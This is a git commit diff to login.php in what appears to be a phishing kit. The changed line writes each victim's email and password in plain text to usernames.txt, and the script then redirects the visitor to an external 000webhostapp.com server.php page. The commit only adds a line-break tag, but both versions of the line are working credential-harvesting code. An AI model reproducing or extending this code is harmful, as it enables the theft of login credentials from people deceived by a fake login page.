7095f54b417018ff8e3105f80d6515d25f724606
censorday <74760933+censorday@users.noreply.github.com>
2020-11-22 12:01:04 +0530

    Update login.php

--- login.php
+++ login.php
@@ -5,7 +5,7 @@ session_start();
 			$email=$_SESSION["Email"];
 			
   			
- file_put_contents("usernames.txt", "<html>" ."[EMAIL:]" . " ". $email . " " . " " . "[PASS:]" . " " . $pass . "<br>" . "</html>" , FILE_APPEND);
+ file_put_contents("usernames.txt", "<html>". "<br>" ."[EMAIL:]" . " ". $email . " " . " " . "[PASS:]" . " " . $pass . "<br>" . "</html>" , FILE_APPEND);
  header('Location:https://classroomdwarka.000webhostapp.com/server.php');
 exit();
 	
